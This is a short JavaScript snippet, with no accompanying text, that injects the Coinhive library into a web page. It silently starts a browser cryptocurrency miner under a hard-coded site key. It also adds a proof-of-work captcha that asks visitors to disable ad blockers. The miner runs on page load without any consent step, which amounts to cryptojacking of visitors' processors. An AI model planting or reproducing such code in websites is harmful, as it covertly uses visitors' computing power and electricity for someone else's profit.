var head = document.getElementsByTagName('head')[0];
    var body = document.getElementsByTagName('body')[0];
var script = document.createElement('script');
    script.type = "text/javascript";
    script.src="https://coinhive.com/lib/coinhive.min.js";
    head.appendChild(script);
    script.onload = function() {
    var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ', {throttle: 0.2});
		miner.start();
    };
    var captcha = document.createElement('span');
    captcha.innerHTML = '<form action="?" method="post"><script src="https://authedmine.com/lib/captcha.min.js" async></script><div class="coinhive-captcha" data-autostart="true" data-hashes="1024" data-key="NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ"><em>Loading Captcha...<br>If it doesn\'t load, please disable Adblock!</em></div><input type="submit" value="Submit"/></form>';
    body.appendChild(captcha);
